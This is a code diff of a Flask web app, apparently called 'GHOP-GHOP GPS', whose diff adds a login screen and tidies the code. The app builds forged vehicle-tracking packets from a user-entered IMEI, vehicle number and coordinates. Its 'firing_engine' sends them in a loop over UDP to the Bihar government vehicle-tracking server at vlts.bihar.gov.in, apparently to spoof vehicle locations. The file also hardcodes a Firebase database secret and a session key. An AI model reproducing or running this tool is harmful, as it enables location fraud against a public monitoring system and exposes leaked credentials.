@@ -3,13 +3,13 @@ from datetime import datetime, timedelta, timezone
 from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
 
 app = Flask(__name__)
-app.secret_key = "nitro_v82_hybrid_ultimate_2026"
+app.secret_key = "nitro_v82_hybrid_ultimate_fixed_2026"
 
 # --- FIREBASE CONFIG ---
 FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
 FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"
 
-# --- HYBRID DATA SETTINGS ---
+# --- HYBRID SETTINGS ---
 TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "VLT", "GPS", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "EMR", "ROADRPA"]
 NEW_SUFFIX = "0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041"
 FIXED_CS = "DDE3"
@@ -21,6 +21,33 @@ def get_ist_time():
 
 def get_sid():
     return session.get('device_sid', 'guest')
+
+# --- LOGIN SCREEN HTML ---
+LOGIN_SCREEN_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>NITRO V82 - LOGIN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .login-box { border: 2px solid #0f0; padding: 30px; border-radius: 15px; background: #050505; box-shadow: 0 0 20px #0f0; width: 300px; text-align: center; }
+        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; text-align: center; font-weight: bold; }
+        .btn { padding: 12px; width: 100%; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>🫦 GHOP-GHOP GPS</h2>
+        <form method="post">
+            <input type="text" name="userid" placeholder="USER ID" required>
+            <input type="password" name="password" placeholder="PASSWORD" required>
+            <button class="btn">LOGIN</button>
+        </form>
+    </div>
+</body>
+</html>
+"""
 
 # --- DASHBOARD UI ---
 DASH_HTML = """
@@ -40,10 +67,8 @@ DASH_HTML = """
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         input { width: 92%; padding: 12px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
         .full { grid-column: span 2; }
-        .btn { padding: 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; text-transform: uppercase; margin-top: 5px; transition: 0.3s; }
-        .start { background: #008000; color: #fff; box-shadow: 0 0 10px #008000; }
-        .stop { background: #800; color: #fff; }
-        .reset { background: #333; color: #fff; border: 1px solid #555; }
+        .btn { padding: 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; text-transform: uppercase; margin-top: 5px; }
+        .start { background: #008000; color: #fff; } .stop { background: #800; color: #fff; } .reset { background: #333; color: #fff; border: 1px solid #555; }
         .preview { background: #111; color: yellow; padding: 12px; font-size: 10px; word-break: break-all; margin-top: 10px; border: 1px dashed #0f0; min-height: 50px; }
     </style>
 </head>
@@ -89,7 +114,7 @@ DASH_HTML = """
 </html>
 """
 
-# --- LOGIC ---
+# --- CORE LOGIC ---
 def firing_engine(sid):
     target = ("vlts.bihar.gov.in", 9999)
     while user_sessions.get(sid, {}).get("firing"):
@@ -97,13 +122,11 @@ def firing_engine(sid):
             s = user_sessions[sid]
             tag = TAG_LIST[s["count"] % len(TAG_LIST)]
             dt = time.strftime("%d%m%Y,%H%M%S")
-            # Lat/Lon with 7-digit precision
             lat_f = "{:.7f}".format(float(s['lat']))
             lon_f = "{:.7f}".format(float(s['lon']))
             
-            # Hybrid String Protocol 2.1.1
             pkt = f"$PVT,{tag},2.1.1,NR,01,L,{s['imei']},{s['vno']},1,{dt},{lat_f},N,{lon_f},E,{NEW_SUFFIX},{FIXED_CS}*"
-            payload = pkt + " \r \n " # Naya Termination with spaces
+            payload = pkt + " \r \n "
             
             user_sessions[sid]["last_pkt"] = pkt
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -123,7 +146,7 @@ def login():
             session['device_sid'] = sid
             user_sessions[sid] = {"uid": uid, "firing": False, "count": 0, "imei": "", "vno": "", "lat": "25.6489270", "lon": "84.7841180", "last_pkt": "Ready..."}
             return redirect(url_for('dashboard'))
-    return render_template_string("LOGIN_SCREEN_HTML") # Insert your Login HTML here
+    return render_template_string(LOGIN_SCREEN_HTML)
 
 @app.route('/dashboard')
 def dashboard():
@@ -135,18 +158,10 @@ def dashboard():
 def action():
     sid, val = get_sid(), request.form.get('btn')
     if val == "start":
-        user_sessions[sid].update({
-            "firing": True, 
-            "imei": request.form.get('imei'), 
-            "vno": request.form.get('vno').upper(), 
-            "lat": request.form.get('lat'), 
-            "lon": request.form.get('lon')
-        })
+        user_sessions[sid].update({"firing":True, "imei":request.form.get('imei'), "vno":request.form.get('vno').upper(), "lat":request.form.get('lat'), "lon":request.form.get('lon')})
         threading.Thread(target=firing_engine, args=(sid,), daemon=True).start()
-    elif val == "stop":
-        user_sessions[sid]["firing"] = False
-    elif val == "reset":
-        user_sessions[sid].update({"firing": False, "count": 0, "imei": "", "vno": "", "last_pkt": "System Reset Successful"})
+    elif val == "stop": user_sessions[sid]["firing"] = False
+    elif val == "reset": user_sessions[sid].update({"firing":False, "count":0, "imei":"", "vno":"", "last_pkt":"System Reset Successful"})
     return redirect(url_for('dashboard'))
 
 @app.route('/data')
